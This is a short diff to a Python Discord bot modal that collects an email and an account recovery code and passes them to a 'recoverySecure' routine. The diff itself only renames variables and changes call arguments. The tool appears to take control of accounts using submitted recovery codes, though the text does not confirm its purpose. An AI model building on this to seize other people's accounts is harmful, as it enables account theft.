@@ -4,18 +4,19 @@ import discord
 from cogs.utils.recoverySecure import recoverySecure
 
 class recoveryModal(ui.Modal):
-    def __init__(self, type: str):
+    def __init__(self):
         super().__init__(title="Recovery Code Securing")
         self.add_item(ui.InputText(label="Email", placeholder="example@gmail.com", required=True))
         self.add_item(ui.InputText(label="Recovery Code", placeholder="XXXXX-XXXXX-XXXXX-XXXXX-XXXXX", required = True))
 
     async def callback(self, interaction: discord.Interaction):
         email = self.children[0].value
-        rcvc = self.children[1].value
+        recovery_code = self.children[1].value
         
         await interaction.response.defer(ephemeral=True)
 
-        account = await recoverySecure(email, rcvc)
+        account = await recoverySecure(email, "rcvcode", {"recovery_code": recovery_code})
+
         if account == "invalid":
             await interaction.followup.send(
                 embed = discord.Embed(
